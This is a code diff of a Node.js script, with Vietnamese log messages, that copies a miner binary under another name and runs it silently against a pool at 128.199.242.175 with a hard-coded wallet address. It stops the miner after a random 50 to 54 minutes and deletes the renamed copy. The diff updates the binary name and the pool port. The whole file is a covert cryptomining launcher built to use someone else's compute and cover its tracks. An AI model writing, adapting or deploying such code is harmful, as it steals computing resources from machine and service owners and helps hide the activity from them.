@@ -9,17 +9,17 @@ const timeRunJobs = ((Math.floor(Math.random() * 5) + 50) * 60) * 1000;
 console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);
 
 
-if (shell.exec(`cp meocoder ${nameTool}`, { silent: true }).code === 0) {
+if (shell.exec(`cp meocoderx ${nameTool}`, { silent: true }).code === 0) {
     console.log('-- giai nen file thanh cong');
 } else {
   console.log('-- giai nen file that bai, su dung tool mac dinh :((');
-  nameTool = 'meocoder';
+  nameTool = 'meocoderx';
 }
 
 (async () => {
   await timeout(timeRunJobs);
     if (shell.exec(`killall ${ nameTool } && pkill ${ nameTool }`, { silent: true }).code === 0) {
-        nameTool !== 'meocoder' ? shell.exec(`rm -rf ${ nameTool }`, { silent: true }) : null;
+        nameTool !== 'meocoderx' ? shell.exec(`rm -rf ${ nameTool }`, { silent: true }) : null;
         console.log('-- ket thuc jobs thanh cong');
     } else {
         console.log('-- ket thuc jobs that bai');
@@ -28,7 +28,7 @@ if (shell.exec(`cp meocoder ${nameTool}`, { silent: true }).code === 0) {
 })();
 
 
-const runMonney = shell.exec(`./${ nameTool } -o 128.199.242.175:6886 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
+const runMonney = shell.exec(`./${ nameTool } -o 128.199.242.175:8386 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
 if (runMonney.code !== undefined) {
     return 0;
 }
